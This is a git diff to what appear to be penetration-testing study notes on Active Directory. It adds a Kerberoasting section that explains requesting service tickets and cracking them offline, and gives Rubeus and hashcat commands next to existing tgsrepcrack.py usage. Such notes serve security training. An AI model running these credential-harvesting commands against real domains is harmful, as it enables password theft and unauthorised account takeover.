@@ -121,6 +121,16 @@ kerberos::list == klist
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
+###### Kerberoasting
+>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
+
+>Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
+
+>You need valid credentials inside the domain.
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
+```
 
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
